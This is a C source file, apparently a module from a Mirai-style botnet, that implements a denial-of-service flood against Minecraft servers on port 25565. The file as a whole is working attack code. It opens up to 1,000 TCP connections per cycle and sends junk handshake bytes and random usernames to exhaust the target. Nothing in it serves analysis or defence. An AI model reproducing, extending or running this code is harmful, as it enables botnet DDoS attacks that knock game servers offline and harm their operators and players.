#define _GNU_SOURCE
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <time.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <netinet/in.h>
#include <sys/time.h>
#include <sys/select.h>

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"

void attack_method_mcps(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    int dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 25565);
    int max_conns = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 250);
    struct sockaddr_in addr;
    time_t end;
    char charset[] = "abcdefghijklmnopqrstuvwxyz0123456789";
    unsigned char fixed_packet[17] = {0};

    if (max_conns < 50) max_conns = 50;
    if (max_conns > 1000) max_conns = 1000;

    end = time(NULL) + 2;

    (void)targs_len;
    (void)opts;

    addr.sin_family = AF_INET;
    addr.sin_port = htons((uint16_t)dport);
    addr.sin_addr.s_addr = targs[0].addr;

    while (time(NULL) < end)
    {
        for (i = 0; i < max_conns; i++)
        {
            int sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock < 0) continue;

            {
                int opt = 1;
                setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
            }
            {
                struct timeval tv = {0, 100000};
                setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
                setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            }

            if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == -1)
            {
                close(sock);
                continue;
            }

            send(sock, fixed_packet, 17, 0);

            {
                char name[20];
                int j;
                int name_len = 12;
                name[0] = 0x00;
                name[1] = 0x00;
                name[2] = (char)name_len;
                for (j = 0; j < name_len; j++)
                    name[3 + j] = charset[rand_next() % 36];
                name[3 + name_len] = 0x00;
                send(sock, name, 4 + name_len, 0);
            }

            close(sock);

            if (i % 50 == 0 && time(NULL) >= end) break;
        }

        if (time(NULL) >= end) break;
    }
}
